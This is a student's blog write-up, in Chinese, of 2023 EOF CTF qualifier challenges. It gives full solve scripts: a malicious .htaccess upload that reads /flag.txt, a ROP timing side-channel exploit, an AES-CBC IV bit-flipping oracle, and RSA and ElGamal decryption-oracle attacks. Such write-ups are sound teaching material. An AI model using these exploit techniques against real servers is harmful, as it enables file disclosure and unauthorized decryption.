---
title: "2023 EOF quals"
date: 2023-01-13T00:34:19+08:00
draft: false
mathjax: true
tags: [CTF, math]
---

# 2023 EOF CTF 初賽

修了計算機安全，然後期末考似乎是參加 EOF CTF 的初賽，另外還要交 writeup。
把我寫的部份放在我的 blog 上水文章（？）
下一篇文章希望是大二上的修課心得，再不寫就要忘光了。

## Web
### Gist
#### problem

```php
<?php
  if(isset($_FILES['file'])){
    $file = $_FILES['file'];

    if( preg_match('/ph/i', $file['name']) !== 0
     || preg_match('/ph/i', file_get_contents($file['tmp_name'])) !== 0
     || $file['size'] > 0x100
    ){ die("Bad file!"); }
    
    $uploadpath = 'upload/'.md5_file($file['tmp_name']).'/';
    @mkdir($uploadpath);
    move_uploaded_file($file['tmp_name'], $uploadpath.$file['name']);

    Header("Location: ".$uploadpath.$file['name']);
    die("Upload success!");
  }
  highlight_file(__FILE__);
?>

<form method=POST enctype=multipart/form-data>
  <input type=file name=file>
  <input type=submit value=Upload>
</form>
```

題目是有一個簡單的 php 網站可以上傳任意檔案，只要檔名和內容不包含 `ph` 就可以上傳，會被放到 `/var/www/html/upload/{somerandomstring}/` 裡面（可以用 `/upload/{somerandomstring}/` 去 access 該資料夾）。
首先第一步就是看背後的 HTTP 伺服器是誰，隨便戳個 404 可以得知是 Apache，那就聯想到 `.htaccess`，去 google 之後得知可以用 `<If file(xxx)>` 來得知檔案內容。
https://blog.csdn.net/solitudi/article/details/116666720

我一開始用的 payload 是

```apache
<If "file('/flag.txt') < 'flag{ABCD'">
ErrorDocument 404 "leq"
</If>
```

不過因為 escape char 的問題只偷得到部份的 flag，把單引號跟雙引號都 escape 掉之後還是有一部分偷不到，不知道怎麼解決，最後是翻到有一個 base64 function 就把 payload 改成

```apache
<If "base64(file('/flag.txt')) < 'RkxBR3tXa'">
ErrorDocument 404 "leq"
</If>
```

最後的 script:

```python
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
from base64 import b64decode

# https://httpd.apache.org/docs/2.4/expr.html
# https://stackoverflow.com/questions/22567306/how-to-upload-file-with-python-requests

url = 'https://gist.ctf.zoolab.org/'

def upload(payload):
    with open('.htaccess', 'wb') as file:
        file.write(payload.encode())
    with open('.htaccess', 'rb') as file:
        res = requests.post(url, files={'file': file})
        # soup = BeautifulSoup(res.text, feature="lxml")
        path = res.url
        path = path[:path.rfind('/') + 1]
    return path

# <If "file('/flag.txt') =~ m#flag{a#i">
def ask_leq(s):
    s = s.replace('\\', '\\\\')
    s = s.replace('\'', '\\\'')
    s = s.replace('\\', '\\\\')
    s = s.replace('"', '\\"')
    # print(s)
    payload = f'''<If "base64(file('/flag.txt')) < '{s}'">
    ErrorDocument 404 "leq {s[-1]}"
    </If>'''
    path = upload(payload)
    res = requests.get(path + 'something404')
    leq = 'leq' in res.text
    # assert '500 Internal Server Error' not in res.text
    return leq

def ask_size_leq(n):
    payload = f'''<If "filesize('/flag.txt') -le {n}">
    ErrorDocument 404 "leq {n}"
    </If>'''
    path = upload(payload)
    res = requests.get(path + 'something404')
    leq = 'leq' in res.text
    assert '500 Internal Server Error' not in res.text
    return leq

# prefix = 'FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match('
# prefix = '''FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match('/h/i',file_get_contents'''
# prefix = '''FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match('/h/i',file_get_contents($file['tmp_name'])'''
# print(len(prefix))

prefix = ''
# prefix = 'RkxBR3tXaDR0XzFmX3RoM19XQUZfYjNjMG0zX3ByZWdfbWF0Y2goJy9oL2knLGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlWyd0bXBfbmFtZSddKSkhPT0w'

for i in range(89 // 3 * 4):
    L = 32
    R = 127

    while R - L > 1:
        M = (R + L) // 2
        if ask_leq(prefix + chr(M)):
            R = M
        else:
            L = M
    prefix += chr(L)
    print(L, prefix)
    if len(prefix) % 4 == 0:
        print(b64decode(prefix.encode()))
```

後來得知這題其實很簡單就可以拿到 flag 了…

```apache
# .htaccess
ErrorDocument 403 %{file:/flag.txt}
```

---

## pwn
### how2know_revenge

原題的 source code:

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <stdlib.h>

static char flag[0x30];

int main()
{
    char addr[0x10];
    int fd;
    scmp_filter_ctx ctx;

    fd = open("/home/chal/flag", O_RDONLY);
    if (fd == -1)
        perror("open"), exit(1);
    read(fd, flag, 0x30);
    close(fd);

    write(1, "talk is cheap, show me the rop\n", 31);
    read(0, addr, 0x1000);

    ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    return 0;
}
```

跟作業一樣被禁用了幾乎所有 syscall。
作業的 how2know 是用 infinite loop 讓我們可以每次分辨出一個 bit，這題只差在說作業會執行我們自己寫的 shell code 而這題只有 buffer overflow，而且有開 NX。不過是 static linked 所以 ROP gadget 和 main/flag 的 address 都直接抓得到。

剩下來的問題就是用 ROP chain 寫一個 while loop 還有 conditional jmp 了。

註：得到 ROP address 可以用 pwntools 附的 `ROPgadget` 這個指令

```bash
ROPgadget --multibr --binary share/chal | fzf
```

```python
from pwn import *
import func_timeout

context.arch = 'amd64'
context.terminal = ['wezterm', 'start']
context.log_level = 'error'

# r = gdb.debug('share/chal', 'break main')
# r = process('share/chal') #, aslr=False)
# gdb.attach(r)

main_addr = 0x401cb5
flag_addr = 0x4de2e0

pop_rax_ret = 0x0000000000458237 # : pop rax ; ret
pop_rsi_ret = 0x0000000000402798 # : pop rsi ; ret
pop_rdi_ret = 0x0000000000401812 # : pop rdi ; ret
pop_rdx_ret = 0x000000000040171f # : pop rdx ; ret

push_rsi_ret = 0x0000000000412b46 # : push rsi ; ret

def gogo(N, OFFSET):
    r = remote('edu-ctf.zoolab.org', 10012)
    # r = process('share/chal')

    ROP = flat(
            pop_rdx_ret, N,
            pop_rax_ret, flag_addr + OFFSET,

            0x0000000000438c36, # : cmp byte ptr [rax], dl ; ret
            0x0000000000493f6e, # : jle 0x494010 ; ret

            # 0x000000000048d0df, # : cmp rax, -3 ; jbe 0x48d0f0 ; ret
            # 0x0000000000402ed9, # : cmp eax, 0xd922a ; ret

            # infinite loop
            pop_rsi_ret, push_rsi_ret,
            push_rsi_ret,
    )

    # print(len(ROP))
    payload = cyclic(0x28) + ROP
    r.send(payload)

    @func_timeout.func_set_timeout(0.5)
    def wait():
        r.recvall()

    try:
        wait()
    except func_timeout.exceptions.FunctionTimedOut:
        return False
    return True


# print(gogo(ord('F'), 0))
# print(gogo(ord('F') - 1, 0))
# print(gogo(ord('L'), 1))
# print(gogo(ord('L') - 1, 1))

ans = ''
for i in range(50):
    L = 32
    R = 127
    while R - L > 1:
        M = (L + R) // 2
        if gogo(M, i):
            R = M
        else:
            L = M
    ans += chr(R)
    print(ans)
```

---

## crypto

### HEX

題目
> 一開始會生成 一個 8 byte 的 token 以及各 16 byte 的 iv、key，並且給我們用 AES CBC 加密 token.hex() 過後的結果。
> 猜中這個 token 就可以得到 flag。
> 我們可以詢問多次用「任意 iv」和原本的 key 解密「任意訊息」，並且得知這個訊息是不是一個 hex string，但要注意如果沒辦法從 bytes decode 回 str 就會直接斷線。

error-based 的 bit-flipping attack 的感覺。根據 AES CBC 的特性，對 iv 的一個 byte xor 某個值等於對解密過後對應的 byte xor 那個值（iv 只會影響第一個 block，每個 block 應該是 16 bytes），所以我們就試著看 token.hex() 的特定一個字元 XOR 哪些數字還會是 `[0-9A-Fa-f]`。

```python
# localtest.py
from Crypto.Cipher import AES
from hashlib import sha256
import os

FLAG = b'FLAG{adnajdlkawjlefjle}'

token = os.urandom(8)
iv = os.urandom(16)
key = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
print(iv.hex() + cipher.encrypt(token.hex().encode()).hex())
print("Hint: ", sha256(token).hexdigest())

cipher = AES.new(key, AES.MODE_CBC, iv=iv)
ct = cipher.encrypt(token.hex().encode())

print(iv, ct)
cipher = AES.new(key, AES.MODE_CBC, iv=iv)

m = cipher.decrypt(ct).decode()
print(m)

goodchr = '1234567890abcdefABCDEF'
mp = {}
for c in goodchr:
    mp[ str(sorted([ord(c) ^ ord(d) for d in goodchr])) ] = c

an = ''
for j in reversed(range(16)):
    possible = []
    for c in range(128):
        inp = iv[:j] + bytes([c ^ iv[j]]) + iv[j+1:] + ct
        # ct[:14] + bytes([c, d]) + suffix

        cipher = AES.new(key, AES.MODE_CBC, iv=inp[:16])
        m = cipher.decrypt(inp[16:])
        m = m.decode()
        try:
            # orgm = m
            m = bytes.fromhex(m)
            print("Well received")
            # print(orgm[-1])
            possible.append(c)
        except:
            print("Invalid")

    c = mp[str(possible)]
    an += c
    print(c)

print(''.join(list(reversed(an))))
exit(0)
```

```python
# solve.py
from pwn import *
from tqdm import tqdm


# context.log_level = 'debug'
# r = process(['python', './chal.py'])
r = remote('eof.ais3.org', 10050)

goodchr = '1234567890abcdefABCDEF'
mp = {}
for c in goodchr:
    mp[ str(sorted([ord(c) ^ ord(d) for d in goodchr])) ] = c

L = r.recvline()
print(L)
inp = bytes.fromhex(L.strip().decode())
print(r.recvline())
iv, ct = inp[:16], inp[16:]

print(iv, ct)

def ask(msg):
    r.recvline()
    r.recvline()
    r.recvline()

    r.sendline(b'1')

    r.sendafter(b'Message(hex): ', bytes(msg.hex() + '\n', 'ascii'))

    return b'Well' in r.recvline()

ans = ''
for j in tqdm(range(16)):
    possible = []
    for c in range(128):
        inp = iv[:j] + bytes([c ^ iv[j]]) + iv[j+1:] + ct
        # ct[:14] + bytes([c, d]) + suffix
        if ask(inp):
            possible.append(c)

    c = mp[str(possible)]
    ans += c

print(ans)

r.recvline()
r.recvline()
r.recvline()

r.sendline(b'2')

r.sendafter(b'Token(hex): ', bytes(ans + '\n', 'ascii'))

print(r.recv())
```

不要 XOR 太大的數字或是修改 `ct`，不然直接不能被 utf-8 decode 就會斷線。

### LF3R
題目給了很像線性遞迴的東西，然後他的確是線性遞迴。
用 BerlekampMassey 就解開ㄌ

```cpp
//   __________________
//  | ________________ |
//  ||          ____  ||
//  ||   /\    |      ||
//  ||  /__\   |      ||
//  || /    \  |____  ||
//  ||________________||
//  |__________________|
//  \###################\Q
//   \###################\Q
//    \        ____       \B
//     \_______\___\_______\X
// An AC a day keeps the doctor away.
 
// clang-format off
/*{{{*/
#ifdef local
// #define _GLIBCXX_DEBUG AC
#include <bits/extc++.h>
#define safe std::cerr<<__PRETTY_FUNCTION__<<" line "<<__LINE__<<" safe\n"
#define debug(args...) qqbx(#args, args)
#define TAK(args...) std::ostream& operator<<(std::ostream &O, args)
#define NIE(STL, BEG, END, OUT) template <typename ...T> TAK(std::STL<T...> v) \
    { O << BEG; int f=0; for(auto e: v) O << (f++ ? ", " : "") << OUT; return O << END; }
NIE(deque, "[", "]", e) ; NIE(vector, "[", "]", e)
NIE(set, "{", "}", e) ; NIE(multiset, "{", "}", e) ; NIE(unordered_set, "{", "}", e)
NIE(map , "{", "}", e.first << ":" << e.second)
NIE(unordered_map , "{", "}", e.first << ":" << e.second)
template <typename ...T> TAK(std::pair<T...> p) { return O << '(' << p.first << ',' << p.second << ')'; }
template <typename T, size_t N> TAK(std::array<T,N> a) { return O << std::vector<T>(a.begin(), a.end()); }
template <typename ...T> TAK(std::tuple<T...> t) {
    return O << "(", std::apply([&O](T ...s){ int f=0; (..., (O << (f++ ? ", " : "") << s)); }, t), O << ")";
}
template <typename ...T> void qqbx(const char *s, T ...args) {
    int cnt = sizeof...(T);
    if(!cnt) return std::cerr << "\033[1;32m() = ()\033\[0m\n", void();
    (std::cerr << "\033[1;32m(" << s << ") = (" , ... , (std::cerr << args << (--cnt ? ", " : ")\033[0m\n")));
}
#else
#pragma GCC optimize("Ofast")
#pragma loop_opt(on)
#include <bits/extc++.h>
#include <bits/stdc++.h>
#define debug(...) ((void)0)
#define safe ((void)0)
#endif // local
#define pb emplace_back
#define all(v) begin(v),end(v)
#define mem(v,x) memset(v,x,sizeof v)
#define ff first
#define ss second
 
template <typename T, T MOD> class Modular {
public:
    constexpr Modular() : v() {}
    template <typename U> Modular(const U &u) { v = (0 <= u && u < MOD ? u : (u%MOD+MOD)%MOD); }
    template <typename U> explicit operator U() const { return U(v); }
    T operator()() const { return v; }
#define REFOP(type, expr...) Modular &operator type (const Modular &rhs) { return expr, *this; }
    REFOP(+=, v += rhs.v - MOD, v += MOD & (v >> width)) ; REFOP(-=, v -= rhs.v, v += MOD & (v >> width))
    // fits for MOD^2 <= 9e18
    REFOP(*=, v = static_cast<T>(1LL * v * rhs.v % MOD)) ; REFOP(/=, *this *= inverse(rhs.v))
#define VALOP(op) friend Modular operator op (Modular a, const Modular &b) { return a op##= b; }
    VALOP(+) ; VALOP(-) ; VALOP(*) ; VALOP(/)
    Modular operator-() const { return 0 - *this; }
    friend bool operator == (const Modular &lhs, const Modular &rhs) { return lhs.v == rhs.v; }
    friend bool operator != (const Modular &lhs, const Modular &rhs) { return lhs.v != rhs.v; }
    friend std::istream & operator>>(std::istream &I, Modular &m) { T x; I >> x, m = x; return I; }
    friend std::ostream & operator<<(std::ostream &O, const Modular &m) { return O << m.v; }
private:
    constexpr static int width = sizeof(T) * 8 - 1;
    T v;
    static T inverse(T a) {
        // copy from tourist's template
        T u = 0, v = 1, m = MOD;
        while (a != 0) {
            T t = m / a;
            m -= t * a; std::swap(a, m);
            u -= t * v; std::swap(u, v);
        }
        assert(m == 1);
        return u;
    }
};

using namespace std;
using namespace __gnu_pbds;
typedef int64_t ll;
typedef long double ld;
typedef pair<ll,ll> pll;
typedef pair<ld,ld> pld;
template <typename T> using max_heap = std::priority_queue<T,vector<T>,less<T> >;
template <typename T> using min_heap = std::priority_queue<T,vector<T>,greater<T> >;
template <typename T> using rbt = tree<T,null_type,less<T>,rb_tree_tag,tree_order_statistics_node_update>;
template <typename V, typename T> int get_pos(const V &v, T x) { return lower_bound(all(v),x) - begin(v); }
template <typename V> void sort_uni(V &v) { sort(all(v)), v.erase(unique(all(v)),end(v)); }
template <typename T> bool chmin(T &x, const T &v) { return v < x ? (x=v, true) : false; }
template <typename T> bool chmax(T &x, const T &v) { return x < v ? (x=v, true) : false; }
constexpr inline ll cdiv(ll x, ll m) { return x/m + (x%m ? (x<0) ^ (m>0) : 0); } // ceiling divide
constexpr inline ll modpow(ll e,ll p,ll m) { ll r=1; for(e%=m;p;p>>=1,e=e*e%m) if(p&1) r=r*e%m; return r; }
/*}}}*/

constexpr ld PI = acos(-1), eps = 1e-7;
constexpr ll maxn = 500025, INF = 1e18, mod = 1000000007, K = 14699, inf = 1e9;
using Mint = Modular<int, mod>;
Mint modpow(Mint e, uint64_t p) { Mint r = 1; while(p) (p&1) && (r *= e), e *= e, p >>= 1; return r; } // 0^0 = 1
// clang-format on

namespace linear_recurrence {
template <typename T>
vector<T> BerlekampMassey(vector<T> a) {
    auto scalarProduct = [](vector<T> v, T c) {
        for (T& x : v) x *= c;
        return v;
    };
    vector<T> s, best;
    int bestPos = -1;
    for (size_t i = 0; i < a.size(); i++) {
        T error = a[i];
        for (size_t j = 0; j < s.size(); j++) error -= s[j] * a[i - 1 - j];
        if (error == 0) continue;
        vector<T> fix = scalarProduct(best, error);
        fix.insert(fix.begin(), i - bestPos, 0);
        if (fix.size() >= s.size()) {
            best = scalarProduct(s, -1 / error);
            best.insert(best.begin(), 1 / error);
            bestPos = i + 1;
            s.resize(fix.size());
        }
        for (size_t j = 0; j < fix.size(); j++) s[j] += fix[j];
    }
    return s;
}
template <typename T>
T deduce(vector<T> a, int64_t n) {
    vector<T> s = BerlekampMassey(a);
    if (s.empty()) return 0;
    // a[i] = \sum s[j] * a[i-j-1]
    vector<T> r = {1};     // 1
    vector<T> e = {0, 1};  // x;
    auto mul = [&s](vector<T> a, vector<T> b) {
        // return a * b % (x^m - s)
        vector<T> c(a.size() + b.size() - 1);
        for (size_t i = 0; i < a.size(); i++)
            for (size_t j = 0; j < b.size(); j++) c[i + j] += a[i] * b[j];
        for (size_t i = c.size() - 1; i >= s.size(); i--)
            for (size_t j = 0; j < s.size(); j++)
                c[i - j - 1] += c[i] * s[j];
        c.resize(s.size());
        return c;
    };
    while (n) {
        if (n & 1) r = mul(r, e);
        e = mul(e, e);
        n >>= 1;
    }
    T sum = 0;
    for (size_t j = 0; j < r.size(); j++) sum += r[j] * a[j];
    return sum;
}
}  // namespace linear_recurrence

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);

    vector<Modular<int,2>> arr =  { 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1 }; // from output.py
    debug(arr.size());
    reverse(arr.begin(), arr.end());

    auto ini = vector<Modular<int,2>>(arr.begin(), arr.begin() + 300);
    auto s = linear_recurrence::BerlekampMassey(ini);
    for (int i = 300; i < arr.size(); i++) {
        ini.push_back(0);
        for (int j = 0; j < s.size(); j++)
            ini[i] += ini[i - j - 1] * s[j];
        arr[i] += ini[i];
        // arr[j] += linear_recurrence::deduce(ini, j);
    }
    reverse(arr.begin(), arr.end());

    int sum = 0;
    for (int j = 0; j < arr.size() - 300; j++) {
        if (j % 8 == 0) arr[j] = 0;
        cout << arr[j];
        sum += (arr[j]() << (7 - j % 8));
        if (j % 8 == 7) {
            cout << ' ' << char(sum);
            sum = 0;
            cout << '\n';
        }
    }
}
```

### popcnt

題目
> 給你 flag 經過 RSA 加密後的結果，然後你可以詢問任意數字解密過後的 popcnt。
> 有一個有趣的地方是一次連線會隨機生成 10 對密鑰，flag 用這 10 對公鑰加密的結果（`enc[i]`）都會告訴你，而且詢問任意數字解密過後的 popcnt 也可以針對任意一對密鑰。
> 每對密鑰的公鑰 $e_i$以及 $N_i$ 都會告訴你。

把 flag 寫作 $x$，因為 RSA 加密是 $x^e \pmod N$的特性，我們可以問 `enc[i] * pow(c, e, n) % n` 就能得到 $cx \\% N$ 的 popcnt。

考慮 $x \\% N$ 和 $2x \\% N$。$2x \\% N$ 沒有進位的話，popcnt 一定會跟 $x \\% N$ 的 popcnt 相同，否則有足夠大的機率 popcnt 會不一樣（我猜剛好一樣的機率可能是 1/1000 之類的量級）
所以我們可以用很高的機率得知 $x$ 是 $\leq N/2$ 還是 $> N/2$。
以此類推我們可以比較 $2^i x \\% N$ 和 $2^{i+1} x \\% N$ 的 popcnt 就能大概猜出 $2^i x \\% N$ 與 $N/2$ 的大小關係。
這等於是問說 $\lfloor \frac{x}{N/{2^{i+1}}} \rfloor$ 的奇偶性之類的
所以我們可以用類似二分搜的方式找到答案。

不過，要注意 popcnt 相同還是有夠大的機率會發生的，我們可以利用一次連線有 10 對密鑰且隨機的特性把這些不常發生的錯誤過濾掉。
我最後的寫法是：
- 有兩個變數 $L, R$ 表示 flag 一定落在 $[L, R]$ 之間。
- 所有人獨立的做 5 輪二分搜得到新的 $[l_i, r_i]$。一次二分搜的輪數有點微妙，不能太大讓一次太多人一起發生錯誤，也不能太小以致於下一個步驟沒有足夠多的資訊辨別出是誰壞掉（？）一開始挑 20 後來改成 5，我覺得 5 應該還不錯。
- 把太小跟太大的丟掉，剩下的聯集起來，得到新的 $[L, R]$。
- 理論上因為做了 5 輪所以區間長度會縮減為 1/32 倍之類的
- 如果區間長度縮減不到 0.1 倍，那大概壞掉太多了，重新連線但不重設 $[L, R]$。不重設很重要，因為是有蠻大的機率在搜到某一段的時候每對都壞掉的，但不同連線得到的 $[L, R]$ 應該要 consistent 所以我們可以原地復活（題目有幫 flag pad 一些 random 的值但不太重要）。

```python
from pwn import *

from Crypto.Util.number import bytes_to_long, long_to_bytes
from base64 import b64encode, b64decode

from fractions import Fraction

from tqdm import tqdm
import pickle

# context.log_level = 'debug'


def init():
    global r, ks, mp
    # r = process(['python', './popcnt.py'])
    r = remote('eof.ais3.org', 10051)
    ks = []
    mp = {}
    for i in range(10):
        n   = bytes_to_long(b64decode(r.recvline().strip()))
        e   = bytes_to_long(b64decode(r.recvline().strip()))
        enc = bytes_to_long(b64decode(r.recvline().strip()))
        mp[n] = i
        ks.append(((n, e), enc))
        assert e == 65537
    # print(n[i], enc[i])

init()

def raw_ask(i, num):
    r.recvline()
    r.recvline()

    r.sendline(b'1')
    r.sendafter(b'To: ', bytes(str(i) + '\n', 'ascii'))
    r.sendafter(b'Message: ', b64encode(long_to_bytes(num)) + b'\n')

    return int(r.recvline().strip())

def ask(n, i):
    j = mp[n]
    (n, e), enc = ks[j]
    return raw_ask(j, enc * pow(2, i * 65537, n) % n)

def reduce(n, L, R, i):
    B = Fraction(n, (2 ** (i + 1)))
    if abs(L // B - R // B) >= 2:
        pass
    if abs(L // B - R // B) == 0:
        return L, R

    M = (L // B) + 1
    # print(f'{M = }')
    # print(f'{int(B) = }')
    # print(f'{int(L) = }')
    # print(f'{int(R) = }')
    if (M % 2 == 0) ^ (ask(n, i) == ask(n, i + 1)):
        return L, M * B
    else:
        return M * B, R

L = 0
R = 1 << 512

prog = []

while R - L > 1:
    prog.append((L, R))
    tlrs = []
    for j in tqdm(range(10)):
        n, e = ks[j][0]
        i = max(0, int(n / (R - L)).bit_length() - 1)
        tL, tR = L, R
        for x in range(5):
            tL, tR = reduce(n, tL, tR, i + x)
        tlrs.append((tL, tR))


    tmp = []
    for tL, tR in tlrs:
        tmp.append(tL)
        tmp.append(tR)

    tmp = sorted(tmp)[2:-2]
    nL, nR = tmp[0], tmp[-1]
#    if not (nL <= flag <= nR):
#        print('failed')
#        mL = min([t[0] for t in tlrs])
#        mR = max([t[1] for t in tlrs])
#        for tL, tR in tlrs:
#            sL = float((tL - mL) / (mR - mL))
#            sR = float((tR - mL) / (mR - mL))
#            print(min(abs(flag-tL), abs(flag-tR)) <= (tR-tL)/2, sL, sR)
#        print(R - L)
#        print(long_to_bytes(int((L+R)/2)))
#        exit(-1)


    print('shrink', float((nR - nL) / (R - L)))
    if (float((nR - nL) / (R - L))) >= 0.1:
        print('failed!')
        r.close()
        init()
        continue
    L, R = nL, nR
    M = (L+R) / 2
    print(long_to_bytes(int(M)))
    # print(float(L), float(flag), float(R))

# print(L, R)
```

### el2dlog

這題的變數好多，整理起來大概可以這樣講：
> 隨機生成 1024 bit 質數 $p_1, q_1$，乘起來得到 $N$。
> 隨機生成 2048 bit 質數 $p_2$
> 隨機生成 $g_1$，保證 $g_1$ 是 $N$ 的二次剩餘且 $\gcd(N, g_1) = 1$。
> 隨機生成 $g_2, d, k \in [2, p_2-2]$
> 告訴你 $N = p_1 q_1$
> 告訴你 $c_1 = g_2 ^ k \\% p_2$
> 告訴你 $c_2 = g_2 ^ {dk} \cdot x \\% p_2$。（$x$ 是我們要求的 flag）
> 我們每次可以丟出兩個數字 $e_1, e_2$ 可以得到 $g^m \\% N$ 的結果，其中 $m = {(e_1 ^ {-d} \cdot e_2) \\% {p_2}}$

另外我們還會知道一個變數 `hint`，其值為 `p2 >> 1024`。

一開始覺得比較 trivial 的東西是可以直接問 `1,1` 得到 $g_1$，然後就可以二分搜得知 $p_2$ 精確是多少了，不過就不知道怎麼繼續做。
想了蠻久的，隊友表示這好像可以用跟前一題類似的作法解決。

注意到如果我們把 $c_1, c_2$ 丟回去詢問，那麼我們就可以得到 $g_1 ^ x$ 的結果了（$x$ 就是我們要求的 flag，不失一般性假設 $x < p_2$），但這個數字量級解不了離散對數，可是我們可以把 $e_2$ 乘上一個數字 $z$ 就能讓 $m = zx \\% p_2$。
因為 $p_2 \neq \varphi(N)$（照原本的 source code $p_2$ 似乎略大於 $\varphi(N)$ 但只要不等於應該都對），我們可以從 $(g_1 ^ {zx\\%p_2}) ^ 2$ 與 $g_1 ^ {(2zx\\%p_2)}$ 是否一樣得知 $zx\\%p_2$ 是否 $\leq p_2 / 2$。

一樣問 2 的冪次就可以得到 flag 了
然後有趣的地方是我們其實不需要知道 $p_2$ 是多少，問了也只是白白浪費時間。
只需要把 p2 當成 `hint << 1024` 就有足夠的精度了。
這題的 timeout 似乎是五分鐘，一開始我有問出 p2 並且使用 p2，不過超時了所以就壓了一點詢問次數到約 1000 次，但還是剛好超時一點點，後來我把網路從 csie 換成 csie-5G 就輕鬆過了 XD
直接從每秒 2~3 個 request 變成每秒十幾個 request。

最後的 script：

```python
from pwn import *

from Crypto.Util.number import bytes_to_long, long_to_bytes, isPrime
from base64 import b64encode, b64decode

from tqdm import tqdm

from fractions import Fraction

# context.log_level = 'debug'

# r = process(['python', './el2dlog.py'])
r = remote('eof.ais3.org', 10052)

n = int(r.recvline().strip().split(b' ')[-1])
c1 = int(r.recvline().strip().split(b' ')[-1])
c2 = int(r.recvline().strip().split(b' ')[-1])
hint = int(r.recvline().strip().split(b' ')[-1])

print(f'{n = }')
print(f'{c1 = }')
print(f'{c2 = }')

# p2 = 0

def ask(e1, e2):
    r.sendafter(b'c1 = ', bytes(str(e1) + '\n', 'ascii'))
    r.sendafter(b'c2 = ', bytes(str(e2) + '\n', 'ascii'))
    return int(r.recvline())

g1 = ask(1, 1)
print(f'{g1 = }')

# #### get p2
# 
# p2 = hint << 1024
# 
# for i in tqdm(range(1024, -1, -1)):
#     if ask(1, p2 + (1 << i)) == pow(g1, p2 + (1 << i), n):
#         p2 += (1 << i)
# p2 += 1
# 
# assert isPrime(p2)
# # assert ((p2 >> 1024) == hint)

#### get flag

lst = []

A = ask(c1, c2 * pow(2, 0))
B = ask(c1, c2 * pow(2, 250))
C = ask(c1, c2 * pow(2, 1024))

assert pow(A, pow(2, 250), n) == B
assert pow(A, pow(2, 1024), n) == C

# highbit 都是 0 先跳過
for i in range(1024):
    if i == 0:
        lst.append(A)
    else:
        lst.append(lst[-1] ** 2 % n)


for i in tqdm(range(2048 - 1024))
    # 一開始是問 c1, c2*pow(2,i,p2)%p2 但沒有必要模 p2
    lst.append( ask(c1, c2 * pow(2, i + 1024)) )

M = Fraction(hint << 1024, 2)

ans = 0

for i in range(2048 - 1):
    if lst[i]*lst[i]%n != lst[i+1]:
        ans += M
    M *= Fraction(1, 2)

for s in range(-5, 5):
    print(long_to_bytes(int(ans + s)))
```

~~這題也是在 local test 發現這種美好的 code 會跑出答案很驚訝的一題~~

```python
lst = []
for i in tqdm(range(2048)):
    lst.append( ask(c1, c2 * pow(2, i) ) )

M = Fraction(p2, 2)

ans = 0

for i in range(2048 - 1):
    if lst[i]*lst[i]%n != lst[i+1]:
        ans += M
    M *= Fraction(1, 2)

print(int(ans), flag)
print(int(ans - flag))
print(float(Fraction(ans, flag)))
```
